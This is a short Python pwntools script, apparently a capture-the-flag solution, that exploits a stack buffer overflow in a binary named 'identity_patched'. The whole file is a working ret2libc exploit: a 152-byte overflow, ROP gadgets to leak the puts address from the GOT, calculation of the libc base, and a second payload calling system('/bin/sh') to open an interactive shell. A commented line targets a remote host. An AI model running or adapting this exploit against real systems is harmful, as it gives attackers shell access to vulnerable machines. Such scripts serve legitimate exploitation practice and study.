#!/usr/bin/env python3

from pwn import *

offset = 152
elf = context.binary = ELF("./identity_patched")
libc = ELF("./libc.so.6")
io = process()
# io = remote("192.168.163.168", 49159)

## ropper --file goated --search 'ret'
ret = 0x000000000040101a 
## ropper --file goated --search 'pop rdi'
pop_rdi = 0x00000000004012c3

payload = flat(b'A' * offset, pop_rdi, elf.got.puts, elf.plt.puts, elf.sym.main)
io.sendlineafter(b"\n", payload)
io.recvline(2)
puts_leak = unpack(io.recvline()[:-1].ljust(8, b"\x00"))
info("Leaked GOT.PUTS: %#x" % puts_leak)

libc.address = puts_leak - libc.sym.puts
info("Updated LIBC base: %#x" % libc.address)

bin_sh = next(libc.search(b'/bin/sh\x00'))

payload = flat(b'A' * offset, pop_rdi, bin_sh, ret, libc.sym.system)
io.sendlineafter(b"\n", payload)
io.interactive()
